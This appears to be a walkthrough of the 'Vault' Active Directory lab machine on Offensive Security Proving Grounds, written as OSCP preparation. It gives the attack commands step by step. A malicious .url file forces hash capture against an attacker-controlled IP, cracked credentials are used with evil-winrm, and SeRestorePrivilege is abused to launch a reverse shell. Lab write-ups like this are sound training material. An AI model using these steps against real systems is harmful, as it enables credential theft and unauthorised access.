Machine Overview

Difficulty: Hard

Platform: Offensive Security Proving Grounds

Description: Vault is a Windows-based Active Directory machine built to challenge a penetration tester’s ability to enumerate, exploit, and escalate privileges within a domain. Initial access hinges on capturing a Net-NTLM hash from a misconfigured SMB share, while escalation paths include abusing SeRestorePrivilege or misconfigured GPOs to gain SYSTEM or domain administrator rights. It’s a realistic multi-step attack chain ideal for OSCP preparation.

What makes Vault notable

Active Directory environment: Vault requires deep AD enumeration and exploitation knowledge. Realistic attack chain: client-side hash capture, privilege escalation, and multiple lateral movement paths. OSCP prep: Like Nagoya and Hokkaido, Vault mimics corporate networks and is frequently recommended for exam practice.

Enumeration with Nmap

Scanned the target for open ports and services:

sudo nmap -sV -sC 192.168.120.172 -oN nmap-vault

Added vault.offsec and dc.vault.offsec to /etc/hosts.

SMB Enumeration

Enumerated SMB shares and discovered a writable DocumentsShare:

nxc smb 192.168.120.172 -u '.' -p '.' --shares

Capturing Hashes from SMB

Uploaded a malicious .url file to the share to force the host to authenticate to our Responder listener:

[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\192.168.45.152\%USERNAME%.icon
IconIndex=1

Cracked the captured NTLMv2 hash to obtain anirudh:SecureHM.

Initial Access with Evil-WinRM

Logged into the machine using the cracked credentials:

evil-winrm -i 192.168.120.172 -u 'anirudh' -p 'SecureHM'

Privilege Escalation

Enumerated privileges and exploited SeRestorePrivilege to run a reverse shell payload:

.\SeRestoreAbuse.exe C:\Users\anirudh\Desktop\reverse.exe

Got SYSTEM on the listener, completing the compromise.
